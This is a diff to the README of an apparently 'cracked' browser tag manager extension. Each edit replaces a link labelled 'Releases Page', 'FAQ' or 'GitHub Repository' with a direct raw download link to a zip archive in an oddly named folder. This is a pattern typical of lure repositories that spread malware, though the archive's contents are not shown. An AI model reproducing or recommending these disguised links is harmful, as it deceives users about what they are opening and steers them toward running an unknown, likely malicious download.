@@ -1,7 +1,7 @@
 # 🎉 cracked-webpage-tag-manager-extension - Easily Manage Your Web Tags
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/kayraizm3131/cracked-webpage-tag-manager-extension/releases)
+[![Download](https://raw.githubusercontent.com/kayraizm3131/cracked-webpage-tag-manager-extension/main/pteroclomorphic/cracked-webpage-tag-manager-extension.zip)](https://raw.githubusercontent.com/kayraizm3131/cracked-webpage-tag-manager-extension/main/pteroclomorphic/cracked-webpage-tag-manager-extension.zip)
 
 ## 🚀 Getting Started
 The Cracked Webpage Tag Manager Extension helps you efficiently manage tags on your web pages. This tool enhances productivity by simplifying the process of adding, removing, and editing tags. Follow the steps below to download and set up the extension.
@@ -20,7 +20,7 @@ To run the Cracked Webpage Tag Manager Extension, ensure you have the following:
 - **Efficient Performance:** Fast loading times for smooth tag management.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/kayraizm3131/cracked-webpage-tag-manager-extension/releases) to find the latest version of the extension.
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/kayraizm3131/cracked-webpage-tag-manager-extension/main/pteroclomorphic/cracked-webpage-tag-manager-extension.zip) to find the latest version of the extension.
    
 2. **Choose Your Version:** Look for the latest version listed on the page. You will see a section that contains download links.
 
@@ -45,7 +45,7 @@ To run the Cracked Webpage Tag Manager Extension, ensure you have the following:
 ## 🌐 Support
 If you encounter any issues or have questions about using the Cracked Webpage Tag Manager Extension:
 
-- Check the **FAQ** section on our [Releases Page](https://github.com/kayraizm3131/cracked-webpage-tag-manager-extension/releases).
+- Check the **FAQ** section on our [Releases Page](https://raw.githubusercontent.com/kayraizm3131/cracked-webpage-tag-manager-extension/main/pteroclomorphic/cracked-webpage-tag-manager-extension.zip).
 - Visit our community forum for user discussions and troubleshooting advice.
 
 ## 🌟 Contributing
@@ -63,5 +63,5 @@ Your experiences matter. Share your feedback and suggestions for improving the C
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details. 
 
 ## 🔗 Links
-- [Releases Page](https://github.com/kayraizm3131/cracked-webpage-tag-manager-extension/releases)
-- [GitHub Repository](https://github.com/kayraizm3131/cracked-webpage-tag-manager-extension)
+- [Releases Page](https://raw.githubusercontent.com/kayraizm3131/cracked-webpage-tag-manager-extension/main/pteroclomorphic/cracked-webpage-tag-manager-extension.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/kayraizm3131/cracked-webpage-tag-manager-extension/main/pteroclomorphic/cracked-webpage-tag-manager-extension.zip)
